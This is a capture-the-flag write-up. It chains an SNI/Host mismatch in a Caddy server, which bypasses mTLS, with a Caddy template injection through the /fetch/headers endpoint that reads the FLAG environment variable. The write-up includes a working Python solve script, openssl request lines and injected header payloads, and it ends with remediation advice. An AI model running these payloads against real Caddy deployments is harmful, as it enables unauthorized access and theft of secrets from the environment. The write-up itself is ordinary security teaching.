# Very Serious Cryptography

## Summary

Challenge Description
```
To get the flag, you need: the mTLS cert, connecting from localhost, ... and break physics? Should be easy!

Challenge note: the handout files contains tls internal while the hosted challenge mostly use real TLS.
```
This challenge is a multistep attack, comprising of exploiting malformed tls cert checking, then exploiting a template injection vulnerability in one of the internal endpoints to get the flag.


**Artifacts:**
* `Caddyfile`: The Caddyfile used to configure the Caddy server.
* `Dockerfile`: The Dockerfile used to build the Caddy server image.
* `docker-compose.yml`: The docker-compose file used to run the Caddy server.
* `request.txt`: The request payload used to exploit the template injection vulnerability.
* `solve.py`: The Python script used to exploit the malformed TLS cert checking and send the request and get the flag.

## Context
There are two technologies that are essential to know to solve this challenge: Caddy and the TLS certificate and how it is checked.

### Caddy
Caddy is a web server, written in go, designed to be simple to configure and deploy. It is defined from a Caddyfile, which defines its configuration settings, as well as endpoints.

This is an example of a configuration of a server in a caddyfile:
```
public.caddy.chal-kalmarc.tf {
        tls internal
        route /hello {
                respond "Hello!" 
        }
}
```
This defines a particular hostname: public.caddy.chal-kalmarc.tf, which will respond to requests to the /hello endpoint with "Hello!". 

Looking at the slightly more complex caddyfile in this challenge, we can see more details:
```
{
        debug
        servers  {
                strict_sni_host insecure_off
        }
}

*.caddy.chal-kalmarc.tf {
        tls internal
        redir public.caddy.chal-kalmarc.tf
}

public.caddy.chal-kalmarc.tf {
        tls internal
        respond "PUBLIC LANDING PAGE. NO FUN HERE."
}

private.caddy.chal-kalmarc.tf {
        # Only admin with local mTLS cert can access
        tls internal {
                client_auth {
                        mode require_and_verify
                        trust_pool pki_root {
                                authority local
                        }
                }
        }

        # ... and you need to be on the server to get the flag
        route /flag {
                @denied1 not remote_ip 127.0.0.1
                respond @denied1 "No ..."

                # To be really really sure nobody gets the flag
                @denied2 `1 == 1`
                respond @denied2 "Would be too easy, right?"

                # Okay, you can have the flag:
                respond {$FLAG}
        }
        templates
        respond /cat     `{{ cat "HELLO" "WORLD" }}`
        respond /fetch/* `{{ httpInclude "/{http.request.orig_uri.path.1}" }}`
        respond /headers `{{ .Req.Header | mustToPrettyJson }}`
        respond /ip      `{{ .ClientIP }}`
        respond /whoami  `{http.auth.user.id}`
        respond "UNKNOWN ACTION"
}
```
We will look harder at the tls declarations later, but for now we can see that there are two different host paths on this server: 

* `public.caddy.chal-kalmarc.tf`: This is the public landing page, which will respond to any requests with "PUBLIC LANDING PAGE. NO FUN HERE."
* `private.caddy.chal-kalmarc.tf`: This is the private landing page, with a number of interesting endpoints.
    * `/flag`: This endpoint is protected by a number of checks, including checking if the address will come from localhost, and a 1\==1 check designed to be impossible to pass.
    * `/cat`: This endpoint just responds with "HELLO WORLD", but is otherwise uninteresting.
    * `/fetch/*`: This endpoint will httpInclude an internal endpoint in the server. This is a trivial way to get around the ip check in the flag endpoint, but is also interesting for reasons that will be explained later.
    * `/headers`: This endpoint takes all of the headers, and pipes them to mustToPrettyJson, which is a template function that will format the headers into a pretty json format
    * `/ip`: This endpoint returns the IP address of the request, useful for checking that fetch is actually making a request from localhost.
    * `/whoami`: This endpoint returns the user ID of the request.

### TLS
TLS is a protocol that is used to authenticate sides of a connection, then encrypt traffic between them. When you send a HTTPS request to a server for the first time, a TLS handshake is performed, which includes the following steps, somewhat simplified:
1. The client sends a "ClientHello" message to the server, which includes the TLS version and available cipher suites.
2. The server responds with a "ServerHello" message, which includes the TLS version and cipher suites.
3. The server sends its certificate to the client, which includes the public key and the server's identity.
4. The client verifies the server's certificate, and if it is valid, it generates a random number and encrypts it with the server's public key.

From then on, the client and server can use the random number as a symmetric cryptographic key to encrypt traffic between them.

It is only at this point that your https request is sent to the server, encrypted with the symmetric key. The server decrypts the request, and sends a response back to the client, which is also encrypted with the symmetric key.

This process allows the user to confirm that the server is who it says it is, and that the traffic between them is encrypted.

This caddy server uses a slightly modified process for the private host called mTLS. This process is identical, but with the additional step of the user providing a certificate to the server, which is then verified by the server. If that certificate does not check out, the server will not respond to the request. 

This is done by the following lines in the caddyfile:
```
        # Only admin with local mTLS cert can access
        tls internal {
                client_auth {
                        mode require_and_verify
                        trust_pool pki_root {
                                authority local
                        }
                }
        }
```

This checks that the client has a local certificate, which is a self signed certificate that is generated by the server. 

## Vulnerabilities

This server has 2 primary Vulnerabilities that can be used in sequence to extract the flag.

### 1. TLS certificate checking
The first is related to the TLS certificate checking. At the top of the Caddyfile, we can see the following line:
```
        servers  {
                strict_sni_host insecure_off
        }
```
This line disables strict SNI host checking. During the TLS handshake, the client sends the SNI (Server Name Indication) feild. This is used to route the TLS packet to the correct virtual host, considering more than one host may be on the same IP address. 

HTTPS requests use a different field called the Host header for the same purpose, and in the vast majority of cases, these two fields are the same. However, in this case, the SNI field is not checked against the Host header.

To attack this vulnerability, we use the following steps:

1. Send the ClientHello message to the server, with the SNI field set to `public.caddy.chal-kalmarc.tf`
2. The server responds with a ServerHello message, and the two complete the TLS handshake, which does not require the client to send a certificate.
3. From this point on, all requests to the server from this client (IP + port num), will be decrypted with the key generated in this handshake, regaurdles off which virtual host they are actually addressed to.
4. The client sends an HTTPS request to the server, with the Host header set to `private.caddy.chal-kalmarc.tf`. This request is decrypted by the server, and the server responds with the response from the private host.

This attack is normally stopped by the server checking that the SNI field matches the Host header upon receiving the HTTPS request. 

### Caddy Template Injection
The second vulnerability is a template injection vulnerability in the Caddy server. 

Before fully exploring the real vurnabilitiy, is is useful to explore the red herring in the /flag vurnability
```
route /flag {
    @denied1 not remote_ip 127.0.0.1
    respond @denied1 "No ..."

    # To be really really sure nobody gets the flag
    @denied2 `1 == 1`
    respond @denied2 "Would be too easy, right?"

    # Okay, you can have the flag:
    respond {$FLAG}
}
```
This performs two checks before returning the flag. The first check is to ensure that the request is coming from localhost. This is is not overly difficult to bypass, just requiring the very convent server side request forgery provided by the /fetch endpoint.

The second check is a 1\==1 check, which is impossible to bypass. Thus, the /flag endpoint can never return the flag, and is only a red herring to get us to play around with the /fetch endpoint and remind us that the flag is stored in an environment variable.

Now, for the actual template injection vulnerability. To test these, I set up the server locally, and started poking around.

Caddy templates were those statements sorounded by `{{ }}` in the Caddyfile. These are used to inject dynamic values into the response. For example, in the /ip endpoint, the template `{{ .ClientIP }}` is used to inject the IP address of the client into the response. 

Looking through the list of caddy template functions, we can see some interesting ones:
* `httpInclude`: This function includes the response from another endpoint in the response, and is already called in the caddyfile.
* `env`: This function returns the value of an environment variable. This is useful for getting the flag, as it is stored in an environment variable.

The existance of the env function gives us a target. If we can somehow call an arbitrary template, we can use the env function to get the flag.

Poking around a little, we can try to find this template injection vulnerability. Requirments are that the endpoint must use user provided input, which imidiatly rules out the /cat, /ip, and /whoami endpoints, as cat uses hardcoded values, and the other two use the client IP and user ID, which we cannot control.

That leaves /fetch and /headers.

By requesting /headers, we can see that the headers are passed to the mustToPrettyJson function, which is a template function that formats the headers into a pretty json format, and returns them to us.

Lets make a request to the /headers endpoint, and see what headers are returned (this is request is made with openssl to bypass the TLS cert checking):
```
openssl s_client -connect 127.0.0.1:443 -servername public.caddy.chal-kalmarc.tf -quiet  
GET /headers HTTP/1.1          
Host: private.caddy.chal-kalmarc.tf
ip: {{.ClientIP}}


```
This request is sent to the server, and the server responds with the following:
```
{
  "Ip": [
    "{{.ClientIP}}"
  ]
}
```

We can see that our template was not processed, and was returned to us as is. This is because the mustToPrettyJson function does not process templates.

That leaves us with the /fetch endpoint. This endpoint uses the httpInclude function, which includes the response from another endpoint in the response. Lets hit the /headers enpoint through this endpoint to see if we can get it to process the templates.
```
openssl s_client -connect 127.0.0.1:443 -servername public.caddy.chal-kalmarc.tf -quiet  
GET /fetch/headers HTTP/1.1          
Host: private.caddy.chal-kalmarc.tf
ip: {{.ClientIP}}


```

This request is sent to the server, and the server responds with the following:
```
{
  "Accept-Encoding": [
    "identity"
  ],
  "Caddy-Templates-Include": [
    "1"
  ],
  "Ip": [
    "172.18.0.1"
  ]
}
```

We can see that the request was processed, and the template was replaced with the IP address of the server. This is a good sign, as it means that the httpInclude function does process templates. (Upon further testing, it seems that the httpInclude function processes all of the templates in whatever it receives from the endpoint it is including).

Lets try to exploit this by including the /headers endpoint in the /fetch endpoint, and passing it a template that will call the env function. 
```
openssl s_client -connect 127.0.0.1:443 -servername public.caddy.chal-kalmarc.tf -quiet  
GET /fetch/headers HTTP/1.1          
Host: private.caddy.chal-kalmarc.tf
exploit: {{env "FLAG"}}


```
Response:
```
HTTP/1.1 500 Internal Server Error
```

Oops, looks like the server is not happy with that. Because we are running this locally, we can dig into the logs to see what happened:
```json
{
  "level": "error",
  "ts": 1743396160.764403,
  "logger": "http.log.error",
  "msg": "template: /fetch/headers:1:3: executing \"/fetch/headers\" at <httpInclude \"/headers\">: error calling httpInclude: template: /headers:15: unexpected \"\\\\\" in operand",
  "request": {
    "remote_ip": "172.18.0.1",
    "remote_port": "43880",
    "client_ip": "172.18.0.1",
    "proto": "HTTP/1.1",
    "method": "GET",
    "host": "private.caddy.chal-kalmarc.tf",
    "uri": "/fetch/headers",
    "headers": {
      "User-Agent": [
        "Mozilla/5.0"
      ],
      "Accept": [
        "*/*"
      ],
      "Connection": [
        "close"
      ],
      "Exploit": [
        "{{env \"FLAG\"}}"
      ]
    },
    "tls": {
      "resumed": false,
      "version": 772,
      "cipher_suite": 4865,
      "proto": "",
      "server_name": "public.caddy.chal-kalmarc.tf"
    }
  },
  "duration": 0.000705071,
  "status": 500,
  "err_id": "z309yqm9f",
  "err_trace": "templates.(*Templates).executeTemplate (templates.go:460)"
}
```
We can see that in creating JSON, the server is automatically escaping the double quotes in the template, which is causing the template to fail.

It is at this point where the solution I came up with departed from the intended solution

The intended solution goes something like this: You realize that throughout the caddyfile, \` and " are used interchangeably, and then you can go and see that go uses \` for raw string literals, and " for regular strings, and that both would work to wrap the word FLAG to get the flag out.

Something like this:
```
openssl s_client -connect 127.0.0.1:443 -servername public.caddy.chal-kalmarc.tf -quiet  
GET /fetch/headers HTTP/1.1          
Host: private.caddy.chal-kalmarc.tf
exploit: {{env `FLAG`}}

```

correctly returns the flag.

I went down a different path, realizing that you could chain several template functions together to get the string literal (as opposed to raw string literal) from the contents of a different header with the following headers:
```
goofy_exploit: {{ .Req.Header.Flag | toString  | substr 1 5 | env}}
flag: FLAG
```
This template gets the header for the flag function, which is a string array by default, pipes it to the toString function, passes it to the substr function to get rid of the brackets around the converted array, then finally passes it to the env function to get the flag.

This took more work to discover, but works just as well.

## Exploit

**Exploit overview**: The exploit works by first exploiting the malformed TLS certificate checking to get access to the private host, then using the template injection vulnerability to get the flag.

**Exploit mitigation considerations**:
* The TLS handshake must be done with the public server before sending the request to the private server. 
* The /flag endpoint is a red herring, we must find an alternative method to get the flag.
* The template injection vulnerability is mitigated by the server escaping double quotes in the template, so we must use a different method to get the flag.

**Input constraints**: double quotes are escaped in the template. We are limited to putting templates in the headers, as that is the only place where the results are passed to us.

**Exploit description**: 
To automatically exploit this vulnerability, I created two files, a python script and a request.

The python script is used to send the request, exploiting the TLS vulnerability, and the request is designed to exploit the template injection vulnerability.

The python script is as follows:
```python
#!/usr/bin/env python3
import socket
import ssl

# Server details
server_host = "127.0.0.1"
server_port = 443
sni_hostname = "public.caddy.chal-kalmarc.tf"

# Read the request content from file
with open("request.txt", "r") as f:
    request_content = f.read().strip() + "\r\n"

# Create SSL context, insures they python doesent get in our way for sending this malformed request (ssl cert and hostname check)
context = ssl.create_default_context()
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE  # Skip certificate verification (like -k option)

# Create socket and connect
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(10)  # 10 second timeout

# Wrap socket with SSL
ssl_sock = context.wrap_socket(sock, server_hostname=sni_hostname)

try:
    # Connect to server
    ssl_sock.connect((server_host, server_port))
    
    # Send HTTP request
    ssl_sock.send(request_content.encode() + b'\r\n')
    
    # Receive response
    response = b''
    while True:
        chunk = ssl_sock.recv(4096)
        if not chunk:
            break
        response += chunk
    
    # Print response
    print(response.decode('utf-8', errors='ignore'))

except Exception as e:
    print(f"Error: {e}")

finally:
    # Close the connection
    ssl_sock.close()
```

This creates a socket connection to the server, wraps the socket in an SSL context, specially configured to allow us to not match the hostname and skip certificate verification, sets the SNI hostname to the public host, and sends the request. 

The request is as follows:
```
GET /fetch/headers HTTP/1.1
Host: private.caddy.chal-kalmarc.tf
User-Agent: Mozilla/5.0 
Accept: */*
Connection: close
intended_exploit: {{ env `FLAG`}}
goofy_exploit: {{ .Req.Header.Flag | toString  | substr 1 5 | env}}
flag: FLAG

```
This request targets the /fetch/headers endpoint on the private host, and includes the template injection exploit in the goofy_exploit header. The intended_exploit header is included as well.

By running this script, when we have the server running locally, we get the following output:
```
{
  "Accept": [
    "*/*"
  ],
  "Accept-Encoding": [
    "identity"
  ],
  "Caddy-Templates-Include": [
    "1"
  ],
  "Connection": [
    "close"
  ],
  "Flag": [
    "FLAG"
  ],
  "Goofy_exploit": [
    "kalmar{test}"
  ],
  "Intended_exploit": [
    "kalmar{test}"
  ],
  "User-Agent": [
    "Mozilla/5.0"
  ]
}
```
We can see that the flag is returned in the intended_exploit header, as well as the goofy_exploit header. 

By switching the server_host variable to the ip of the remote host, we are able to extract the real flag!.


**Exploit primitives used**:
* Template Injection: We used the template injection vulnerability to inject a template that would call the env function, which would return the flag.
* Server Fronting: We exchanged a TLS handshake with one virtual host running behind an IP, then used that to send a request to a different virtual host running on the same IP.

## Remediation

* TLS certificate checking: The server should check that the SNI field matches the Host header, and reject any requests that do not match. This is the default behavior on most servers, and had to be explicitly disabled in this case.
* Template Injection: The server should sanitize user input before passing it to the template engine, and reject any requests that contain templates. This is fairly challenging to do correctly, so a more foolproof alternative is just to never run a template engine on user defined data. In this case, the headers were being returned to a function that automatically ran templates on its input.

## Configuration Notes
To run the server locally, you will need to install docker and docker-compose. Then, run the following command in the same directory as the docker-compose.yml file:
```
docker-compose up --build
```

This will build the server image and start the server. You can then run the python script to exploit the vulnerability and get the flag.
```
python3 solve.py
```